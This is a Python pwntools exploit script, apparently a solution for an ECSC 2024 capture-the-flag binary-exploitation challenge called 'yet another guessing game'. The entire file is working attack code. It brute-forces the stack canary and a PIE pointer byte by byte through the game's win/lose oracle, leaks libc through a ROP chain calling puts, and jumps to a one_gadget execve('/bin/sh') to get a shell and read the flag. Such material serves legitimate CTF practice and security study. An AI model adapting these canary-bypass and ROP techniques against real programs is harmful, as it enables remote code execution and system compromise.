#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import time
from pwn import *

HOST = os.environ.get("HOST", "yetanotherguessinggame.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38010))

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
exe = context.binary = ELF(os.path.join(os.path.dirname(__file__), 'build/yet_another_guessing_game'), checksec=False)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

def play(payload, io, next=True):
    io.sendafter(b'Guess the secret!\n', payload)
    next = b"y" if next else b"n"
    res = True if b"You win!" in io.recvline() else False
    io.sendafter(b"Wanna play again? (y/n)\n", next)
    return res

def brute_block(io, padding, block_prefix, block_len):
    block = b""
    while True:
        found = False
        for c in range(1, 256):
            guess = block_prefix + block + p8(c) + b"\x00"
            guess = guess + b"A" * (0x8 - len(guess))

            payload = padding                                   # input
            payload += guess                                    # input
            payload += b"A" * (0x28 - len(payload))             # input
            payload += padding                                  # secret starts here
            payload += block_prefix + block

            if play(payload, io):
                found = True
                block += p8(c)
                print(f"[+] found {len(block)}/{block_len}")
                break

        if not found:
            return None

        if len(block) == block_len:
            break

    return block

MAX_ATTEMPTS = 10
for attempt in range(1, MAX_ATTEMPTS + 1):
    found = False
    print(f"[*] attempt {attempt}/{MAX_ATTEMPTS}")
    io = start()

    # Overwrite canary nullbyte
    payload = b"A" * 0x28           # input
    payload += b"B" * 0x10          # secret
    payload += b"D"                 # canary null byte
    play(payload, io)

    # Leak canary
    print("[*] bruting canary")
    try:
        canary = brute_block(io, cyclic(0x10), b"A", 7)
    except:
        canary = None

    if canary is None:
        print(f"[-] attempt {attempt} failed")
        io.close()
        continue

    canary = u64(b"\x00" + canary)
    print(f"[+] canary: {hex(canary)}")

    # Leak pie
    print("[*] bruting pie")
    try:
        leak = brute_block(io, cyclic(0x20), b"", 6)
    except:
        leak = None

    if leak is None:
        print(f"[-] attempt {attempt} failed")
        io.close()
        continue

    found = True
    break

if not found:
    print("[-] all attempts failed :(")
    exit()

leak = u64(leak + b"\x00\x00")
print(f"[+] leak: {hex(leak)}")
LEAK_OFFS = 0x1483
pie_base = leak - LEAK_OFFS
print(f"[+] pie_base: {hex(pie_base)}")

exe.address = pie_base
payload = b"A" * 0x10
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += b"A" * 0x10
payload += p64(canary)      # canary
payload += p64(0x0)         # rbp

POP_RDI = pie_base + 0x0000000000001503
ropchain = p64(POP_RDI)
ropchain += p64(exe.got["puts"])
ropchain += p64(exe.plt["puts"])
ropchain += p64(exe.sym.game)
payload += ropchain
play(payload, io, False)
io.recvuntil(b"Goodbye!\n")
leak = u64(io.recvline()[:-1].ljust(8, b"\x00"))
print(f"[+] puts: {hex(leak)}")
PUTS_OFFS = 0x84420
libc_base = leak - PUTS_OFFS
print(f"[+] libc_base: {hex(libc_base)}")

payload = b"A" * 0x10
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += b"A" * 0x10
payload += p64(canary)      # canary
payload += p64(0x0)         # rbp

ONE_GADGET = libc_base + 0xe3b01        # execve("/bin/sh", r15, rdx)
ropchain = p64(ONE_GADGET)

payload += ropchain
play(payload, io, False)
io.recvuntil(b"Goodbye!\n")
time.sleep(1)
io.sendline(b"cat flag")
res = io.clean(1)
print(res.decode())
